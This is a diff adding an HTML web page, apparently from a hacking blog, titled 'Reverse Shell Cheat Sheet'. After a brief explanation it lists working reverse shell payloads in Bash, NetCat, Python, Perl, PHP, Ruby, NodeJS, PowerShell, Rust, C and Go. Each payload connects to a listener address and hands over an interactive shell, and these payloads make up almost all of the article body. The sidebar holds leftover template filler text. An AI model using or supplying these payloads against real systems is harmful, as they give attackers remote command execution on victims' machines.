@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Page of Hackers™ | Reverse Shell Cheat Sheet</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/animate.css">
+    <link rel="stylesheet" href="/css/owl.carousel.min.css">
+    <link rel="stylesheet" href="/css/owl.theme.default.min.css">
+    <link rel="stylesheet" href="/css/magnific-popup.css">
+    <link rel="stylesheet" href="/css/ionicons.min.css">
+    <link rel="stylesheet" href="/css/flaticon.css">
+    <link rel="stylesheet" href="/css/icomoon.css">
+    <link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/rev.css">
+  </head>
+  <body>
+
+    <div class="container pt-5">
+			<div class="row justify-content-between">
+				<div class="col">
+					<a class="navbar-brand" href="index.html">Page of Hackers™</a>
+				</div>
+				<div class="col d-flex justify-content-end">
+					<div class="social-media">
+		    		<p class="mb-0 d-flex">
+						<a href="https://github.com/halfq" class="d-flex align-items-center justify-content-center"><span class="fa fa-github"><i class="sr-only">Github</i></span></a>
+                        <a href="https://twitter.com/rnf7H" class="d-flex align-items-center justify-content-center"><span class="fa fa-twitter"><i class="sr-only">Twitter</i></span></a>
+                        <a href="https://www.youtube.com/channel/UCX9YXJOjBlc77mDVMHOULNg" class="d-flex align-items-center justify-content-center"><span class="fa fa-youtube"><i class="sr-only">YouTube</i></span></a>
+		    		</p>
+	        </div>
+				</div>
+			</div>
+		</div>
+		<nav class="navbar navbar-expand-lg navbar-dark ftco_navbar bg-dark ftco-navbar-light" id="ftco-navbar">
+	    <div class="container">
+	    
+	      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#ftco-nav" aria-controls="ftco-nav" aria-expanded="false" aria-label="Toggle navigation">
+	        <span class="fa fa-bars"></span> Menu
+	      </button>
+				<form action="#" class="searchform order-lg-last">
+          <div class="form-group d-flex">
+            <input type="text" class="form-control pl-3" placeholder="Search">
+            <button type="submit" placeholder="" class="form-control search"><span class="fa fa-search"></span></button>
+          </div>
+        </form>
+	      <div class="collapse navbar-collapse" id="ftco-nav">
+	        <ul class="navbar-nav mr-auto">
+	        	<li class="nav-item"><a href="index.html" class="nav-link">Home</a></li>
+	        	<li class="nav-item"><a href="about.html" class="nav-link">About</a></li>
+	        	<li class="nav-item active"><a href="posts.html" class="nav-link">Posts</a></li>
+	          	<li class="nav-item"><a href="contact.html" class="nav-link">Contact</a></li>
+				 <li class="nav-item"><a href="donate.html" class="nav-link">Donate <i class="fa fa-bitcoin"></i> <i class="fa fa-paypal payPalLogo"></i></a></li>
+	        </ul>
+	      </div>
+	    </div>
+	  </nav>
+    <!-- END nav -->
+
+    <section class="hero-wrap hero-wrap-2" style="background-image: url('/images/bg_3.jpg');" data-stellar-background-ratio="0.5">
+      <div class="overlay"></div>
+      <div class="container">
+        <div class="row no-gutters slider-text align-items-end">
+          <div class="col-md-9 ftco-animate pb-5">
+          	<p class="breadcrumbs mb-2"><span class="mr-2"><a href="index.html">Home <i class="ion-ios-arrow-forward"></i></a></span> <span class="mr-2"><a href="posts.html">Posts <i class="ion-ios-arrow-forward"></i></a></span> <span>Reverse Shell Cheat Sheet<i class="ion-ios-arrow-forward"></i></span></p>
+            <h1 class="mb-0 bread">Reverse Shell Cheat Sheet</h1>
+          </div>
+        </div>
+      </div>
+    </section>
+   	
+		<section class="ftco-section ftco-degree-bg">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 ftco-animate">
+          	<p>
+              <img src="/images/hacking-satellite/satellite.jpg" alt="" class="img-fluid">
+            </p>
+			<h1>What are Reverse Shells?</h1>
+			<p>We understand that to establish a reverse shell connection is when you are listening from any port with programs such as NetCat, then when you are in listening mode there you are listening to view incoming connections via protocols such as TCP/UDP. Reverse shells are known as a way of attack, but also one of the functionalities of this is to connect as a client to the shell (terminal) of the corresponding person who ran the connection service from a terminal.</p>
+			<br>
+			<img src="images/ReverseShells/ReverseShell.png">
+			<br></br>
+			<h3>Bash</h3>
+			<p>Bash reverse shells operate on Linux/Unix systems.</p>
+			<reV>bash -c 'bash -i >& /dev/tcp/192.168.0.28/443 0>&1 &'</reV> 
+			<br></br>
+			<h3>NetCat</h3>
+            <p>NetCat is available on Linux/Unix systems.</p>
+            <reV>nc -e /bin/sh 192.168.0.28 443</reV>
+            <br></br>
+			<h3>Python3</h3>
+            <p>Done and tested from Python3.</p>
+            <pre>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</pre>
+            <br></br>
+			<h3>Perl</h3>
+            <p>Perl Reverse Shell</p>
+            <pre>perl -e 'use Socket;$i="192.168.0.28";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'</pre>
+            <br></br>
+			<h3>PHP</h3>
+            <p>PHP, a language that can establish TCP/UDP connections.</p>
+            <reV>php -r '$sock=fsockopen("192.168.0.28",443);exec("/bin/bash -i <&3 >&3 2>&3");'</reV>
+            <br></br>
+			<h3>Ruby</h3>
+            <p>Ruby, pure and hard language.</p>
+            <pre>ruby -rsocket -e'f=TCPSocket.open("192.168.0.28",443).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'</pre>
+            <br></br>
+			<h3>NodeJS</h3>
+            <p>NodeJS, widely used in the branch.</p>
+			<pre>(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/bash", []);
+    var client = new net.Socket();
+    client.connect(443, "192.168.0.12", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/
+})();</pre>
+<h3>PowerShell</h3>
+<p>PowerShell, system language widely used in Windows 10.</p>
+<pre>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.12',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+            <br></br>
+			<h3>Rust</h3>
+            <h6>Rust, a compiler language better than C++.</h6>
+			<br></br>
+            <reV>rustc reverse.rs (Compile)</reV>
+            <br></br>
+			<pre>use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
+fn main() {
+	let sock = TcpStream::connect("localhost:443").unwrap();
+	let fd = sock.as_raw_fd();
+	Command::new("/bin/bash")
+		.arg("-i")
+		.stdin(unsafe { Stdio::from_raw_fd(fd) })
+		.stdout(unsafe { Stdio::from_raw_fd(fd) })
+		.stderr(unsafe { Stdio::from_raw_fd(fd) })
+		.spawn()
+		.unwrap()
+		.wait()
+		.unwrap();
+}</pre>
+			<h3>C</h3>
+            <p>C, compiled language for systems.</p>
+            <reV>gcc shell.c -o shell (Compile)</reV>
+            <br></br>
+			<pre>#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+	<span class="pl-k">int</span> <span class="pl-en">main</span>(void){
+	<span class="pl-k">int</span> <span class="pl-en">port</span> <span class="pl-k">=</span> <span class="pl-c1">443</span>;
+	<span class="pl-smi">struct</span> <span class="pl-en">sockaddr_in</span> <span class="pl-en">revsockaddr</span>;
+
+	<span class="pl-k">int</span> <span class="pl-en">sockt</span> <span class="pl-k">=</span> <span class="pl-en">socket</span>(<span class="pl-smi">AF_INET</span>, <span class="pl-smi">SOCK_STREAM</span>, <span class="pl-c1">0</span>);
+	<span class="pl-smi">revsockaddr</span>.<span class="pl-smi">sin_family</span> <span class="pl-k">=</span> <span class="pl-smi">AF_INET</span>;       
+	<span class="pl-smi">revsockaddr</span>.<span class="pl-smi">sin_port</span> <span class="pl-k">=</span> <span class="pl-en">htons</span>(<span class="pl-smi">port</span>);
+	<span class="pl-smi">revsockaddr</span>.<span class="pl-smi">sin_addr</span>.<span class="pl-smi">s_addr</span> <span class="pl-k">=</span> <span class="pl-en">inet_addr</span>(<span class="pl-s"><span class="pl-pds">"</span>192.168.0.28<span class="pl-pds">"</span></span>);
+
+	<span class="pl-en">connect</span>(<span class="pl-smi">sockt</span>, (<span class="pl-smi">struct</span> <span class="pl-smi">sockaddr</span> <span class="pl-k">*</span>) <span class="pl-k">&amp;</span><span class="pl-smi">revsockaddr</span>, 
+	<span class="pl-en">sizeof</span>(<span class="pl-smi">revsockaddr</span>));
+	<span class="pl-en">dup2</span>(<span class="pl-smi">sockt</span>, <span class="pl-c1">0</span>);
+	<span class="pl-en">dup2</span>(<span class="pl-smi">sockt</span>, <span class="pl-c1">1</span>);
+	<span class="pl-en">dup2</span>(<span class="pl-smi">sockt</span>, <span class="pl-c1">2</span>);
+
+	<span class="pl-smi">char</span> <span class="pl-k">*</span> <span class="pl-smi">const</span> <span class="pl-smi">argv</span>[] <span class="pl-k">=</span> {<span class="pl-s"><span class="pl-pds">"</span>/bin/bash<span class="pl-pds">"</span></span>, <span class="pl-smi">NULL</span>};
+	<span class="pl-en">execve</span>(<span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>, <span class="pl-smi">argv</span>, <span class="pl-smi">NULL</span>);
+
+	<span class="pl-k">return</span> <span class="pl-c1">0</span>;       
+}</pre>
+<h3>GoLang</h3>
+<p>GoLang lenguage of power.</p>
+<pre>echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.12:443");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go</pre>
+          </div> <!-- .col-md-8 -->
+          <div class="col-lg-4 sidebar pl-lg-5 ftco-animate">
+            <div class="sidebar-box">
+              <form action="#" class="search-form">
+                <div class="form-group">
+                  <span class="icon icon-search"></span>
+                  <input type="text" class="form-control" placeholder="Type a keyword and hit enter">
+                </div>
+              </form>
+            </div>
+            <div class="sidebar-box ftco-animate">
+              <div class="categories">
+                <h3>Categories</h3>
+                <li><a href="#">Construction <span class="ion-ios-arrow-forward"></span></a></li>
+                <li><a href="#">House Renovation <span class="ion-ios-arrow-forward"></span></a></li>
+                <li><a href="#">Painting <span class="ion-ios-arrow-forward"></span></a></li>
+                <li><a href="#">Architecture Design <span class="ion-ios-arrow-forward"></span></a></li>
+                <li><a href="#">Interior Design <span class="ion-ios-arrow-forward"></span></a></li>
+                <li><a href="#">Preconstruction Planning <span class="ion-ios-arrow-forward"></span></a></li>
+              </div>
+            </div>
+
+            <div class="sidebar-box ftco-animate">
+              <h3>Recent Posts</h3>
+              <div class="block-21 mb-4 d-flex">
+                <a class="blog-img mr-4" style="background-image: url(/images/image_1.jpg);"></a>
+                <div class="text">
+                  <h3 class="heading"><a href="#">Even the all-powerful Pointing has no control about the blind texts</a></h3>
+                  <div class="meta">
+					<div><a href="#">Page of Hackers™ - 2022</a></div>
+                  </div>
+                </div>
+              </div>
+              <div class="block-21 mb-4 d-flex">
+                <a class="blog-img mr-4" style="background-image: url(/images/image_2.jpg);"></a>
+                <div class="text">
+                  <h3 class="heading"><a href="#">Even the all-powerful Pointing has no control about the blind texts</a></h3>
+                  <div class="meta">
+					<div><a href="#">Page of Hackers™ - 2022</a></div>
+                  </div>
+                </div>
+              </div>
+              <div class="block-21 mb-4 d-flex">
+                <a class="blog-img mr-4" style="background-image: url(/images/image_3.jpg);"></a>
+                <div class="text">
+                  <h3 class="heading"><a href="#">Even the all-powerful Pointing has no control about the blind texts</a></h3>
+                  <div class="meta">
+					<div><a href="#">Page of Hackers™ - 2022</a></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+        </div>
+      </div>
+    </section> <!-- .section -->
+
+    <footer class="footer">
+			<div class="container-fluid px-lg-5">
+				<div class="row">
+					<div class="col-md-9 py-5">
+						<div class="row">
+							<div class="col-md-4 mb-md-0 mb-4">
+								<h2 class="footer-heading">Half</h2>
+								<p class="copyright">Copyright &copy;<script>document.write(new Date().getFullYear());</script> - Page of Hackers™</p>
+								<ul class="ftco-footer-social p-0">
+									<li class="ftco-animate"><a href="https://twitter.com/rnf7H" data-toggle="tooltip" data-placement="top" title="Twitter"><span class="ion-logo-twitter"></span></a></li>
+                                    <li class="ftco-animate"><a href="https://www.youtube.com/channel/UCX9YXJOjBlc77mDVMHOULNg" data-toggle="tooltip" data-placement="top" title="YouTube"><span class="ion-logo-youtube"></span></a></li>
+                                    <li class="ftco-animate"><a href="https://github.com/halfq" data-toggle="tooltip" data-placement="top" title="GitHub"><span class="ion-logo-github"></span></a></li>
+		            			</ul>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</footer>
+
+  <!-- loader -->
+  <div id="ftco-loader" class="show fullscreen"><svg class="circular" width="48px" height="48px"><circle class="path-bg" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke="#eeeeee"/><circle class="path" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke-miterlimit="10" stroke="#F96D00"/></svg></div>
+
+  <script src="js/jquery.min.js"></script>
+  <script src="js/jquery-migrate-3.0.1.min.js"></script>
+  <script src="js/popper.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/jquery.easing.1.3.js"></script>
+  <script src="js/jquery.waypoints.min.js"></script>
+  <script src="js/jquery.stellar.min.js"></script>
+  <script src="js/jquery.animateNumber.min.js"></script>
+  <script src="js/owl.carousel.min.js"></script>
+  <script src="js/jquery.magnific-popup.min.js"></script>
+  <script src="js/scrollax.min.js"></script>
+  <script src="js/main.js"></script>
+    
+  </body>
+</html>
